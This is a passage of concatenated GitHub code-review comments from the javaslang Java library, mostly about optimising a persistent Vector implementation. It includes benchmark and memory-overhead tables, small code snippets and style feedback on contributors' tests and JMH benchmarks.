org.pcollections.TreePVector uses 1.7 MB (1.1 MB overhead, 36.0 bytes overhead per element)\n    fj.data.Seq uses 3.3 MB (2.6 MB overhead, 84.1 bytes overhead per element)\n    javaslang.collection.Vector uses 1.9 MB (1.3 MB overhead, 41.4 bytes overhead per element)\n``\n. @danieldietrich, done, please check out the new force pushed version!\n. no more caching, but can be re-introduced easily later\n. should I repeat the declaration instead?\n. managed to rewrite it toinsertAllsomehow \\:D/\n. a lot less noise, thanks to static imports\n. yes, it does, this is the memory consumption of the new development version ofVector`:\n``\nfor 32 elementsjava.util.ArrayListuses504 bytes(0 bytesoverhead,0.0bytes overhead per element)scala.collection.immutable.Vectoruses536 bytes(32 bytesoverhead,1.0bytes overhead per element)clojure.lang.PersistentVectoruses704 bytes(200 bytesoverhead,6.2bytes overhead per element)org.pcollections.TreePVectoruses1.7 KB(1.2 KBoverhead,38.8bytes overhead per element)fj.data.Sequses3 KB(2.5 KBoverhead,80.0bytes overhead per element)javaslang.collection.Vectoruses536 bytes(32 bytesoverhead,1.0` bytes overhead per element)\nfor 1024 elements\n    java.util.ArrayList uses 18.6 KB (0 bytes overhead, 0.0 bytes overhead per element)\n    scala.collection.immutable.Vector uses 19.3 KB (672 bytes overhead, 0.7 bytes overhead per element)\n    clojure.lang.PersistentVector uses 20 KB (1.4 KB overhead, 1.4 bytes overhead per element)\n    org.pcollections.TreePVector uses 54.7 KB (36.1 KB overhead, 36.1 bytes overhead per element)\n    fj.data.Seq uses 102.3 KB (83.7 KB overhead, 83.7 bytes overhead per element)\n    javaslang.collection.Vector uses 20 KB (1.4 KB overhead, 1.4 bytes overhead per element)\nfor 32768 elements\n    java.util.ArrayList uses 638.4 KB (0 bytes overhead, 0.0 bytes overhead per element)\n    scala.collection.immutable.Vector uses 659 KB (20.7 KB overhead, 0.6 bytes overhead per element)\n    clojure.lang.PersistentVector uses 683.8 KB (45.4 KB overhead, 1.4 bytes overhead per element)\n    org.pcollections.TreePVector uses 1.7 MB (1.1 MB overhead, 36.0 bytes overhead per element)\n    fj.data.Seq uses 3.3 MB (2.6 MB overhead, 84.1 bytes overhead per element)\n    javaslang.collection.Vector uses 683.8 KB (45.4 KB overhead, 1.4 bytes overhead per element)\n```\ni.e. for many elements it has ~30x less memory overhead (and is around 5x faster).\nStill not finished, though.\n. Actually, for small sizes it's even better :).\nAlso, I might be able to get rid of a few values at the very end - we'll see.\n. It's funny, the BitSet has negative overhead :D\n. K is~~n't~~ comparable, so we should hope the natural order works\n. should I assert more than this?\n. I agree that iterator should be totally lazy, thanks for providing a PR.\nHowever, it may be simpler if we implemented it without a supplier, e.g.:\n``` java\nreturn new AbstractIterator() {\n    T current;\n@Override\npublic boolean hasNext() {\n    return true;\n}\n\n@Override\npublic T getNext() {\n    current = (current == null) ? seed : f.apply(current);\n    return current;\n}\n\n};\n``\n. my personal preference would be to omit the text in the Exception, the name of the test already explains the intent :)\n. @danieldietrich will decide anyway, and he doesn't hatenulls as much as I do :).\nI personally would simply document in this case, not to usenullirresponsibly :)\n. :+1: for using the new datetime api and not reinventing the wheel\n. you could probably usejava.time.Monthhere instead\n. instead of+ 1you could userangeClosed`\n. instead of the months you could use:\njava\nList.of(Month.values()))\n. nof?\nI think divisorCount would make more sense?\n. how did you come up with the end result :)?\n. please rename l, it looks like 1 :)\njava\nfactors(long number)\nedit: abbreviations should be avoided in the public interface anyway\n. same\n. Indeed, also, shouldn't the snapshots be for 2.1 or 3.0, instead of 2.0?\n. The modified files had too many warnings, reduced and extracted them to simplify the review of next commit\n. inlined it in the end, as that's how it's done in other similar cases also\n. this passes without the fix also ... is this what you wanted, @danieldietrich?\n. same here, passes without the fix also\n. toList() doesn't call the keyComparator, only keySet() does.\nIs this ok, @danieldietrich?\n. isn't this rather the current element?\nIt's confusing that we're storing a next, that's actually the previous :/\n. Minor: please format the source code before submitting :)\n. Minor: please leave the original indentation in these cases.\nIn Idea you can configure it in:\nFile | Settings | Editor | Code Style | Java\nWrapping and Braces | Ternary operation | Align when multiline | \u2611\n. that is null doesn't sound very useful to me.\nCould we rename that to target or something less context dependent :)?\n. @danieldietrich is it ok that we're ignoring the leftovers?\nShouldn't they have the same length?\n. please provide a more useful description for this parameter :)\n. Minor: unnecessary formatting (the previous was better aligned, see comment below)\n. Can we weaken the return type?\n. Than please format only the VCS changed lines :) (or manually revert the ones that were better formatted before)\n. I know.\n. You can try extract to variable (ctrl alt v) make it compile and inline it back (ctrl alt v).\nThis usually works for me :)\n. please update the description, to contain the Euler 20 also :)\n. please test the value presented in the above example also:\njava\nassertThat(sumOfFactorialDigits(10)).isEqualTo(3 + 6 + 2 + 8 + 8 + 0 + 0);\n. we could use reduce instead of fold, like:\njava\nreturn Stream.rangeClosed(1, n)\n             .map(BigInteger::valueOf)\n             .reduce(BigInteger::multiply);\n. CharSeq makes String composable (instead of wrapping it into a Stream) and instead of map/sum/int we could also use foldLeft:\njava\nreturn CharSeq.of(factorial(n).toString())\n              .foldLeft(0, (sum, c) -> sum + Character.digit(c, 10));\n. btw, following the above style (the one the description mentioned also), the 100! test would be:\njava\n        assertThat(sumOfFactorialDigits(100)).isEqualTo(9 + 3 + 3 + 2 + 6 + 2 + 1 + 5 + 4 + 4 + 3 + 9 + 4 + 4 + 1 + 5 + 2 + 6 + 8 + 1 + 6 + 9 + 9 + 2 + 3 + 8 + 8 + 5 + 6 + 2 + 6 + 6 + 7 + 0 + 0 + 4 + 9 + 0 + 7 + 1 + 5 + 9 + 6 + 8 + 2 + 6 + 4 + 3 + 8 + 1 + 6 + 2 + 1 + 4 + 6 + 8 + 5 + 9 + 2 + 9 + 6 + 3 + 8 + 9 + 5 + 2 + 1 + 7 + 5 + 9 + 9 + 9 + 9 + 3 + 2 + 2 + 9 + 9 + 1 + 5 + 6 + 0 + 8 + 9 + 4 + 1 + 4 + 6 + 3 + 9 + 7 + 6 + 1 + 5 + 6 + 5 + 1 + 8 + 2 + 8 + 6 + 2 + 5 + 3 + 6 + 9 + 7 + 9 + 2 + 0 + 8 + 2 + 7 + 2 + 2 + 3 + 7 + 5 + 8 + 2 + 5 + 1 + 1 + 8 + 5 + 2 + 1 + 0 + 9 + 1 + 6 + 8 + 6 + 4 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0);\n. minor: formatting\n. :+1: \n. It's the same ternary alignment I mentioned below.\nIt's an unrelated modification anyway (that doesn't make the code better), it's reason I recommended a revert.\n. It's like returning an LinkedList, the user of the code shouldn't care whether we change it to ArrayList, they should only see List in the public interface.\nThe same applies here, we should probably return Set, so that we can freely modify the underlying structure later.\n. That's why I asked. Could you please investigate if for me?\n. It's not, it's just more compact. :)\nYou could still use:\njava\nCharSeq.of(factorial(n).toString())\n       .map(c -> Character.digit(c, 10))\n       .sum().intValue();\nif you think it expresses the problem conceptually better :)\n. ~~Does it fail before?~~\nIt passed before the change also, that's why I asked.\n. :+1: \n. list of known values with indices for the first few (problematic) values.\n. enabled all the values from Integer\n. multiple assignment would really help here :/\n. could we pattern match here instead :)?\n. long n -> int n\n. removed related casts also\n. This is how Idea formats it, if I put the forEach on that line.\nWill put in on the next :)\nedit: done\n. All the operations are delegated to this entity, hence the rename.\nback can have too many meanings.\n. merged\n. minor: had inconsistent formatting\n. this was needed for the new Vector impl\n. no need for the if\n. Once this is finished, I would be very interested in >10m - I can't run that on my laptop anymore :p\n. Clojure's pop is the same as init, not as tail :/\n. random access is what we're after, not linear (Scala optimizes for linear, by storing the previous element. I don't think we want that. (i.e. store in an immutable data structure the last element that was accessed))\n. it's more similar to the rest this way\n. was testing List, not Vector\n. it's changeable from code, is used from tests to validate multiple levels.\nIn Scala they're not testing the upper levels, as it would take too much time\n(it wasn't even functional in Scala for 6 years, when someone finally gave it a try for billions of elements)\nscala\ndisplay4 = display5((newIndex >> 20) & 31).asInstanceOf[Array[AnyRef]] // 20 -> should be 25\nif (display4 == null) display4 = new Array(32)\ndisplay3 = display4((newIndex >> 20) & 31).asInstanceOf[Array[AnyRef]]\nif (display3 == null) display3 = new Array(32)\ndisplay2 = display3((newIndex >> 15) & 31).asInstanceOf[Array[AnyRef]]\n. I'm using lots of asserts at this stage, they helped me a lot, as there are very many stages to go to/from, I want to fail early.\nWill delete some of them once the impl is more stable.\n. This way of creating everything from bottom up proved to be 4-10x faster than both clojure and scala:\njava\nOperation Ratio                                          32     1024    32768\nCreate    slang_persistent/java_mutable               0.85\u00d7    0.32\u00d7    0.39\u00d7\nCreate    slang_persistent/fjava_persistent         199.60\u00d7  136.82\u00d7  121.88\u00d7\nCreate    slang_persistent/pcollections_persistent  107.03\u00d7  171.81\u00d7  244.89\u00d7\nCreate    slang_persistent/clojure_persistent         0.91\u00d7    8.62\u00d7    8.39\u00d7\nCreate    slang_persistent/scala_persistent          12.90\u00d7    5.97\u00d7    4.32\u00d7\n. @danieldietrich\n. AbstractIterator is too heavy here\n. ~~prepend, set and append~~\n. ~~ideas are welcome on how to iterate quickly on 3 iterators :/~~\nEdit: will try to put the VectorN iterator idea here instead, i.e. iterate over arrays.\nEdit2: that actually helped, now it's faster than Clojure and Scala:\nOperation  Ratio                                          32     1024    32768   100000 \nIterate    slang_persistent/java_mutable               1.24x    0.37x    0.45x    0.45x\nIterate    slang_persistent/fjava_persistent         513.15x  362.38x  339.26x  323.20x\nIterate    slang_persistent/pcollections_persistent   21.07x   11.39x    8.81x   11.42x\nIterate    slang_persistent/clojure_persistent         1.08x    0.84x    1.31x    1.28x\nIterate    slang_persistent/scala_persistent           2.23x    1.16x    1.04x    1.08x\n. ~~this is the bottleneck for prepend and append.~~\nedit: fixed\n. It's embarrassing how many bugs were revealed by this :speak_no_evil: \n. yes, it's an if statement, not an empty block\n. these aren't necessarily needed :)\n. Thanks, fixed it in a next commit already :)\n. ~~Not yet the case ...~~\n. It is production ready, this is an intermediary commit :)\nBut we can leave it open, I don't mind, I'm planning on optimizing it further when I will have time again :)\n. If it's merged, I will, but I consider it WIP until I optimize all the usecases I TODOed :)\n. Valid question, because we use java.util.Arrays from the same classes and I didn't want to fully qualify it.\nI think the internal Collections should also be renamed to Collections2  (Guava style), or SlangCollections, since we definitely need both from the same namespace.\n. Yes, the ones I'm using as staging areas.\n\nThe first and last arrays have dynamic lengths (are shifted to the correct index on drop), but the middle one has internal offset to avoid shifting.\nThe first one is only empty if everything is empty; if the last is empty, so is the middle.\nThe first and last have a max size equal to the branching factor.\n// TODO The middle should only contain full blocks - padded via the offset.\n. It's a valid argument, but unfortunately I need it as-is for the moment, as it should work for prepend, update and append also.\nI might be able to refactor it to something more coherent when I'm done with the rest of the optimizations :)\n. @danieldietrich, could you help me in making javaslang-test accessible from the project, and rewriting a few of the tests from here, javaslang-test style?\n. Thanks for providing alternative benchmarks :).\nIt would be nice if the build would be passing before asking for code reviews.\nAlso, please use the same style as the other benchmarks do (e.g. final local variables, method naming, encapsulation in separate classes with a base class)\n. isn't result 0 here???\n. you are testing reduce here also, not just the for\n. please explain\n. no important changes, but at least the warning is gone :p\n. https://github.com/functionaljava/functionaljava/blob/master/etc/release-notes/release-notes-4.6.adoc\n\nEdit: @danieldietrich, I just found that they implemented a new priority queue with finger trees in this version.\nI attached the benchmark with results :)\n. this is horrible ...\n. ... or move the build to Gradle, which probably recognizes that it's still a DAG ...\n. * 0 ???\n. that's a big array, why would you need something like that???\n. check the bytecode, this is probably 0 instantly (though certainly jitted to 0)\n. I don't really like where all this is going, neither the fact that the build isn't even passing (again, please run it locally before committing).\nThese tests should be a LOT simpler and a lot more intuitive, otherwise we don't know what to say about the results.\n. this doesn't seem like an array :)\nDo you need both?\n. why would you unbox it by hand?\nPlease inline this, there's no need to do that (don't take my word for it, measure the difference)\nEdit: or rather use the xor trick that does some validity checking also\n. I don't think we need this, you're already checking the speed of the same thing in the above example.\nIs there any significant difference between the two approaches? (besides that this is O(n^2))?\n. yes, the difference will be squared also\n. Thanks @zsolt-donca, fixed this in the latest commit :)\n. ~~Done~~\n@danieldietrich, actually, I would need to fully qualify 10+ more files, I would rather keep the Guava naming (and rename the internal Collections as Collections2, but that's another story).\n. should I compare it against remove(0) also (this impl has a memory leak, as Clojures has also)?\n. Why didn't the tests catch this?\n. lots of expensive asserts for now, to make sure the invariants are kept.\n. this was a surprising optimization for me :)\n. https://github.com/javaslang/javaslang/pull/1449/commits/ebad20ce474b04764d3e988ffb04ec59b53b88fb#diff-c6c1876105d111251f38e0916d4d99a4R65 WHY?\n. these apply the offsets to the leading and tailing arrays, truncating them to the stored length.\nWill try to think of a better name for them :)\n. This enables fast drop for front and back, i.e. in case of the leading and trailing arrays (which are not part of the tree structure), we can keep the full array and store how much we've dropped.\nThis is useful in case of multiple drop calls (e.g. tail) and has a constant memory surplus (in worst case, 2*(branchingFactor-1))\n. Instead of comments, you could put the additions inside the method :)\njava\n assertThat(sumOfDivisors(220)).isEqualTo(1 + 2 + 4 + 5 + 10 + 11 + 20 + 22 + 44 + 55 + 110)\n. an alternative would be:\njava\nfinal double root = Math.sqrt(n);\nreturn root = (int) root;\n. msd = ?\n. you could map every value to its complement in a tuple and you probably wouldn't need the isPerfectSquare anymore (if (t._1 == t._2) or something).\nThat would also better separate the concerns of summing and calculating the factors, I think.\n. I'm not sure, but I think you should memoize this method, as you're recalculating the same values multiple times (i.e. 5 coins + rest -> the calculation of rest would be the same if you would have 5x1 coins)\n. You're perfectly right.\nI will try to unify it (maybe even get rid of the class as it uses more memory and is slightly slower because of that additional indirection) :/\n. I removed the additional indirection without making the code worse - I think it's actually cleaner now.\nThe speed is also considerably better, almost always faster than anything else, while usually using less or equal memory :).\nThanks @zsolt-donca, anything else? @danieldietrich? @eduardmanas?\n. basically append, but renamed in order to be able to statically import it\n. Any help would be appreciated here :/\nwhy is \njava\nSystem.arraycopy(array, 0, copy, 1, array.length); // prepend\nalmost twice as fast as\njava\nSystem.arraycopy(array, 0, copy, 0, array.length); // append\n?\n. these assure the invariants presented in the description, i.e.\n- that the leading is only empty if the whole vector is empty;\n- the middle tree's leafs have size equal to the branchingFactor();\n- the trailing is only empty, if the midle tree is also.\n. I'm testing that the previous versions are all intact - just to be sure I didn't accidentally modify an existing array;\n. Clojure has only an linear prepend :/\n. we don't want to see bit shift operations spread around the code ...\n. strangely the size of the constructor made the algorithms a lot slower, even if all the below if statements were false :|\nSeparated it to a simple constructor and normalization method, used mainly by drop and take.\n. we can calculate the middle size to be full always, and put the rest in trailing\n. if we don't have a trailing yet (just a leading), we should append there instead\n. head will always be in the leading, no need to run the checks present in get (it's a lot faster this way)\n. unrelated, but useful :)\n. will try to rebase all these modifications to the correct commit, so that I don't modify the same line twice ...\n. yup, removed Helper and Vector1 :)\n. bytes weren't as useful as I hoped they would :/\n. I don't like these abbreviations, why not with1, with2 ... with3 instead?\n. I think they're too short and quite confusing, I have to read the doc to understand what they do.\n. The new date-time API has withs, I think they're less confusing than a set (which could imply that the Tuple is mutable)\n. See: http://openjdk.java.net/jeps/254\n. Could be \nJava\ndelegate.map(Character::toLowerCase).equals(that.delegate.map(Character::toLowerCase))\nalso, but this should be a lot more optimal (it can short circuit in case of non-equality, and only converts to lowercase if not equal)\n. this is the 3.0.0 branch\n. should we memoize this?\nMaybe with a SoftReference to avoid surplus memory?\n. oh yeah, tail, update, prepend, append, subSequence, trim just became effectively constant (without memory leak) :)\n. I think this test was wrong before, other seqs have the value true here\n.  // TODO investigate the effect of storing bytes in case of ASCII chars\nhttp://openjdk.java.net/jeps/254\n. already present in parent\n. could be useful\n. change this to \njava\npublic static Class<?> toPrimitive(Class<?> wrapper) {\n    return wrapper;\n}\nto disable primitive conversion\n. This might help in the Java 9 migration also :)\n. separated all the reflective calls\n. return wrapper to disable unboxing\n. arrays are stored as Objects and extracted via reflection or casting\n. we could also just take the type of the first element ...\n. changed reflection to casts (10x speedup)\n. Here the values are not boxed at all (if the provided specialized methods are used for retrieval)\n. do we have to reimplement everything just for the return type? (would normally be in a specialized class, extending the parent)\n. you're splitting the string and reappending it?\nConsider putting the operator in front to make it more obvious (and to format it better).\n... or simply\njava\nassertThat(map.mkString(\", \"))\n        .isEqualTo(\"(110427681, 5), (663160547, 1), (1571254982, 9)\");\n. hmm, isn't TreeSet a SortedSet?\n. this formatting seems weird ... maybe we should put a throw new ISE inside :/\n. ~~order is matter~~ the order matters\n. - isn't n always bigger than 2 here?\n- consider extracting Math.sqrt(n), as we're recalculating it every time now\n. getting the array that contains the given index enables the user to avoid boxing :)\npackage private for now, could be used internally in CharSeq or BitSet\n. can be used for non-boxed iteration also\n. non-boxed head access\n. unboxed iteration seems to be 20x faster :D\n. = boolean, void, float, short\n. char and byte will enable unboxed CharSeq storage :D\n. everything is stored as it is provided: if it was boxed before, it will be stored as such.\nIf we get a primitive array, we will store it like that.\n. I think you should cast it to long, otherwise it will do the conversion every time\n. if you're interested for values <2, I think those should come before the $(2L)\n. You could extend this to all numbers, divisible by 2, like:\njava\nCase($(n -> n % 2 == 0), n -> n == 2)\n. if you create the Vector from primitives, it will store it as such internally\n. random ^ random == false ... always\nhttps://en.wikipedia.org/wiki/Exclusive_or#Truth_table\n. same\n. - you can put this in the field instead\n- please init the random with e.g. 0, we want deterministic performance tests!!!\n. you could make this a void and add a Blackhole bh as parameter\njava\ntry {\n    this.throwsException();\n    assert false\n} catch (RuntimeException e) {\n        bh.consume(e);\n}\n(please apply these suggestions to the rest of the codebase also)\n. same here\n. you should either have a bh or a return\n. FYI: you're measuring unboxing here also\n. .collect ?\n@danieldietrich?\n. you're defining this, but not using it below, e.g. line 59\n. please use deterministic randoms here, otherwise xor could have a predictable outcome\n. not exactly sure what you would like to achieve, but this is certainly wrong :)\n. Please do :)\nWhy would it be a problem if the method would always throw?\nAlso, the JMH samples contain snippets of when it optimizes stuff and when it cannot :)\n. changed it back to 4gb, to enable bigger collections also\n. somebody should run it for the disabled values also (I don't have enough memory)\n. remove(0) might be cheating (i.e. making ArrayList look worst), but subList has its drawbacks also, i.e. access will depend on the number of subList wrappers\n. Clojure doesn't have a tail\n. Scala optimizes for sequential access (i.e. it extracts the most recently used leaf node, providing actual constant time access to it). I personally find it weird that an immutable data structure stores part of its history...\nWhat we want is to simulate random access, hence the iteration.\n. Clojure's Vector doesn't have an prepend, so I'm reconstructing everything every time to simulate a prepend\n. just a quick validation to be sure the data structure is persistent\n. has memory leak :/\n. has memory leak :/\n. simplify Vector to make the review of its replacement simpler\n. https://github.com/javaslang/javaslang/issues/1479\n. The testing framework should have caught this, right @danieldietrich?\n. slice = drop + dropRight\n. https://github.com/javaslang/javaslang/issues/1479\n. was testing List, not Vector\n. This will be constant time in the next version, I'm optimizing now for simpler review.\nWould you like me to introduce this only when the complexity is also better? (i.e. the next PR)\n. It was redundant, already defined in interface \u03bb<R> extends Serializable.\nI could still leave it there if you think it's more readable, it just makes no difference to the compiler.\n. It was O(n) before also, but I will change it temporarily back, if it bothers you\n. It was put back in a later commit, I just realized after pushing that I forgot to rebase the final back here :)\nForce pushed a new version :)\n. dead code is almost certainly eliminated, but why would you wanna' test that?\n. ~~I had to find an intermediary representation that removed the HAMT (but was still working correctly).\nIn a later commit it's replaced again with BMT, but will replace it with appendAll or something here :)~~\nThanks, changed it to Iterator.of :)\n. Done :)\n. if we can assume that we won't construct any other empty instances, than indeed, it can be removed, thanks :)\n. k, will put this in the next commit then, where take and drop are O(1)\n. Yes, that's basically what I just pushed:\n``` java\npublic  Vector map(Function<? super T, ? extends U> mapper) {\n    Objects.requireNonNull(mapper, \"mapper is null\");\nfinal Iterator<? extends U> results = iterator().map(mapper);\nreturn ofAll(results);\n\n}\n``\n. yes\n. Valid question, it could in the past, lemme' recheck  :)\n. Nope, it cannot, fixed\n. We've made a copy (and a drop) ofarray[previousOffset]and a insert it back there.\nAfter that, we dive deeper and make the newly modified node the current array (to which we'll do the same).\nI.e. indropwe don't have to go to the leaf and come back again (as inupdate` ... though we could do both in the same style, I will investigate), we just have to go down, the new root is already stored.\n. sure, we can open it up later, if needed.\nEdit: even though everything that is accessed from the parent class should be package private, otherwise an accessor will be generated for it\n. done\n. will update the method body for now, if that's ok :)\n. Sure, will move it. The rest of the methods (e.g. getAt) are there to avoid all the casts the code would need, as it's not typesafe by nature (we're storing array of arrays and array of values in the same tree).\nLater these methods may also help in the primitivization commit (it's the same abstraction).\n. though I've done it in a separate commit, as now all completely unrelated classes have to have a fully qualified java.util.Arrays\n. ... you did point out an asymmetry though :)\ndrop and take should have had a similar structure (one was iterative, the other recursive).\nBy changing take to be iterative (i.e. the equivalent of a tail recursive call) it became a lot simpler and twice as fast  :).\ni.e. before:\njava\nSlice     slang_persistent/scala_persistent  0.77\u00d7  1.10\u00d7  1.15\u00d7\nafter\njava\nSlice     slang_persistent/scala_persistent  0.79\u00d7  2.00\u00d7  2.27\u00d7\nThanks :D.\n. Thanks, though this iterated twice over the depth.\nI managed to unify depth traversal in a single method, hope you like that also :).\n. prepend, append, update, drop and take now use this iterative method instead\n. If @danieldietrich doesn't mind, I would love to do that (done)\n. Of course, thanks.\nEdit: force pushed.\n. There's a measurable difference this way :dancer: \nThanks @danieldietrich!\nbefore:\njava\nOperation  Ratio                                32   1024  32768 \nUpdate    slang_persistent/scala_persistent  1.03\u00d7  0.93\u00d7  1.17\u00d7\nPrepend   slang_persistent/scala_persistent  0.64\u00d7  0.58\u00d7  0.44\u00d7\nAppend    slang_persistent/scala_persistent  0.84\u00d7  0.33\u00d7  0.26\u00d7\nSlice     slang_persistent/scala_persistent  0.74\u00d7  1.19\u00d7  1.47\u00d7\nafter:\njava\nOperation  Ratio                                 32   1024  32768 \nUpdate     slang_persistent/scala_persistent  1.04\u00d7  1.14\u00d7  1.24\u00d7\nPrepend    slang_persistent/scala_persistent  0.64\u00d7  0.58\u00d7  0.43\u00d7\nAppend     slang_persistent/scala_persistent  0.94\u00d7  0.37\u00d7  0.29\u00d7\nSlice      slang_persistent/scala_persistent  0.79\u00d7  1.23\u00d7  1.64\u00d7\n. It's called once per operation, e.g. one update will call modifyLeaf once.\nBut don't worry about GC, through escape analysis short-lived lambdas might end up on the stack, instead of the heap (https://dzone.com/articles/java-lambdas-and-low-latency).\n. only 8 :/\n. as stated in the above JavaDoc, untyped Object array, to get rid of call-site casts (and make room for non-Object based arrays also)\n. introduced, to avoid boxing (i.e. Function2<Object, Integer, Object[]>)\n. this was a weird one ... if I put an if statement in front of the arraycopy, the performance will be halved (i.e. if (size > 0), which should only simplify things...)\n. it probably nulls out the array otherwise...\n. should be optimized by appending whole arrays instead...\n. same\n. drop and tail could be optimized to only modifying the tree, if anything other than the leaf should be changed (i.e. something like if (n - offset > branchingFactor()))\n. this could be optimized via constructing mutable leafs and inserting those into the tree\n. this distinction is important for update, where the length isn't changed\n. iterator should be optimized by getting the corresponding leaf array and iterating over that (instead of finding it every time)\n. Sure, that's how create worked previously also: https://github.com/javaslang/javaslang/pull/1449/commits/d0b782f386271cb2fa6c2dcc7d2bcbe2c79a57bc#diff-c6c1876105d111251f38e0916d4d99a4R24\ni.e. create the array locally, populate it, put it in the tree and don't keep any other references to it :)\n. I did, please check https://github.com/javaslang/javaslang/pull/1504/files/a07dbff7904d85c9d5c7a457dc913d88a681ddff..dcc87bc47d9541d2e07e96cf42f174c23211a932#diff-c89f0d7cf85723aceb8e16223092d4f1R240\n. yes, run the main from VectorBenchmark :)\n. Sure, it was mainly for debugging (I've seen that many other Javaslang tests print out content, but I agree that they shouldn't) :)\n. (I will keep System.out.println(\"using seed \" + seed); as it's the only way to reproduce it in case of failure)\n. sure, _1 is an Array, _2 is a Vector (https://github.com/javaslang/javaslang/pull/1504/files/a07dbff7904d85c9d5c7a457dc913d88a681ddff..dcc87bc47d9541d2e07e96cf42f174c23211a932#diff-c89f0d7cf85723aceb8e16223092d4f1R168)\n. Simplified it further...\n. Good idea, let's see how it affects performance :)\n. Until now you could only append full leafs (proposed here as optimization) and didn't see the point in renaming it back and forth.\nRenamed both :)\n. ~~It affected performance slightly, so I kept both fields, renamed them and added a convenience method to avoid the call-site apply.~~ it kept only the method at the end, the measurements weren't that obvious, let's go with the simpler code\n. Not sure what the protocol is in these cases, @danieldietrich?\n. added leak detection, i.e. if slice only keeps a few elements from a lot, its size should be small\n. Indeed, thanks :)\n. Yup, stupid leftover code, fixed :)\n. gradle would run them in forked JVMs and all tests should run with BRANCHING_BASE = 2 also, but you're right that this introduces unwanted statefulness (and the fix is easy)\nThanks!.\n. yes, it's effectively constant, like I said\n. I could put this particular logic inside BMT, but it wouldn't scale.\nI think it would hinder reusability, as leaf and index will be used by the optimized iterator also.\nIn addition you can't primitivize a getter (it would have to return an Object), but you can cast an array and get the value out without boxing.\nIf you still think I should extract it, I will.\n. Done: \njava\nassert (EMPTY == null) || ((length > 0) && (array.length > 0));\n. Currently everything is an Object[] but the trailing and leading arrays would be T[]s and would need casts.\nI could convert them to Object[] also (slightly reducing type safety), but they still wouldn't work for the primitivized alternative (though I may be able to work around that, as it's an empty instance).\nHowever, I consider empty array creation the responsibility of the Arrays helper method, not Vector's.\nIf you don't agree, I will change it like you asked :)\n. Do you mean treating all non-full arrays (i.e. first and last, the rest should be full) as semi-mutable arrays (i.e. masked out parts to be modifiable)?\nIn simple cases it could probably be done, but not if we allow valid null values too (If I prepend, drop and prepend, while keeping all the intermediary states, the second prepend could only override values, if the value was null, but that might have been inserted by the first prepend), i.e.\n- of(1) -> (1)\n- prepend(null) -> (null, 1)\n- drop(1) -> null, (1)\n- prepend(1) -> (1, 0)\n. I could move the iterator at this stage, but when I'll introduce the leading and trailing, I would need to put it back.\nI've had a separate get method at first also, but later decided that it's the same.\nWill put both in BMT and move it back when the PR needs it, if that's ok.\n. Would it be ok if I rather pushed an updated formatter config instead, that supports aligning ternaries?\nFile | Settings | Editor | Code Style | Java | Wrapping and Braces | Align when multiline \u2611\n. https://github.com/javaslang/javaslang/pull/1517\n. I think this can be useful when someone's viewing the sources (I commented BMT thoroughly).\n@danieldietrich?\n. Done, let's merge it, as I have at least 2 more PRs to prepare :)\n. Sure, will do, but will have to delete it later when the leading and trailing are introduced to optimize append and prepend (in order to be able to iterate over all arrays, cannot combine 3 iterators efficiently otherwise)\n. Force pushed a new version.\n@danieldietrich, I thought you were interested in the simplest solution in this commit.\nI consider this explicit iterator an optimization.\n. @danieldietrich, you're checking the bytecode, not the JITted result.\nIf you're interested whether they're inlined or not, create a JMH test, enable print inlining and run the tests :). But then again, it may be JDK dependent ... maybe even processor dependent.\n\nPlease use globalIndex < length here.\n\nOk, I will, but I though you asked me to do optimizations in another commit.\n. > yes, run the main from VectorBenchmark :)\n. > We could add a class RunAllBenchmarks if needed.\njavaslang.JmhRunner#main:\njava\n/**\n * Runs all the available benchmarks in precision mode.\n * Note: it takes about 3 hours.\n */\npublic static void main(String[] args) {\n    final Array<Class<?>> CLASSES = Array.of(\n            ArrayBenchmark.class,\n            BitSetBenchmark.class,\n            CharSeqBenchmark.class,\n            HashSetBenchmark.class,\n            ListBenchmark.class,\n            PriorityQueueBenchmark.class,\n            VectorBenchmark.class\n    );\n    runDebugWithAsserts(CLASSES);\n    runSlowNoAsserts(CLASSES);\n}\n. During optimizations I don't want to wait for pcollections and fjava, so I just delete these temporarily:\njava\nJmhRunner.runNormalNoAsserts(CLASSES, SCALA, JAVASLANG);\n. now we only modify the tree (via append and prepend), if we have full arrays, not one-by-one\n. since we have trailing and leading arrays, we move the iterator to include those also\n. BMT nodes are dropped, but leafs aren't: they're masked by offset and length.\nThe first array was always prepended by null anyway, so only the last node might be bigger this way by at most 31 elements. However, since it's not copied at all, it will usually save a lot more memory.\n. if we have a tree that has unnecessary height, compact it\n. the leading has elements always, making the get(0) slightly faster (~30%, compared to get(0))\n. this is surprisingly slow, i.e. 3x slower than Vector\n. it's faster to write where I read from, instead of creating an empty array and writing the values from the source\n. ... as the TODO states ...\nThis method will help with the primitivization iteration also, avoiding boxing\n. after the leaf iterator this impl is quite simple\n. Please provide more params so that we can observe a trend\n. Please stop doing this, (i ^ i) + (j ^ j) == 0 and the compiler knows this.\nMeasure, don't guess!\n. ... yes it does ...\n. you're testing binary branching, i.e. an if.\nA switch is meant for more branches.\njava's switch can be linear or can sometimes binary search or a lookup table.\nJavaslang's is always linear.\nPlease test them properly.\n. switch (random) when random is actually a constant...\n. :+1: \n. please use the provided random ... why do you need bytes here?\n. Arrays.asList(string, string)\n. single elements should rather be returned, not consumed\n. the name used elsewhere is just slang.\nPlease do your homework, it's frustrating to point out so many mistakes that you should have caught...\n. Sorry, I don't really understand what you're implying.\nAre you suggesting an optimization?\n. K, I will introduce a Javaslang MutableWrapper for this then, so that we can assign values from inside a lambda.\n@danieldietrich?\n. That would be nice :)\nAre you referring to the fact that toArray already copies everything? That's actually an optimization, since it enabled System.arrayCopy usage, which uses SIMD instructions to speed up copies.\nCould you please try your idea out, I would be very happy if we could speed up things further :)\n. > I will come back with a suggestion, please hold your horses.\nI made some other modifications also, will push so that you can give the suggestions based on the latest codebase :).\n\nThis is top priority because our users have serious problems.\n\nUnderstood.\n. simplified this significantly\n. testing filter is tricky: how many elements should it keep???\nTherefore I added 3 variants: keeps everything, keeps around half and deletes everything.\n. @danieldietrich, @valery1707, do you think these docs have any value?\nIt's like putting a javadoc to a getValue: \"this function returns the value\"\n. FYI: https://github.com/javaslang/javaslang/issues/1528\n. @danieldietrich is the word hash part important here?\nThe user should care about the properties of the set (i.e. sorted, keeps insertion order etc), not whether we're using hashing or not\n. Thanks, it's ok, in my local primitivization commit I changed it too, to:\njava\nstatic Object copy(Class<?> type, Object array, int minLength) {\n    final int length = lengthOf(array);\n    return arrayCopy(type, 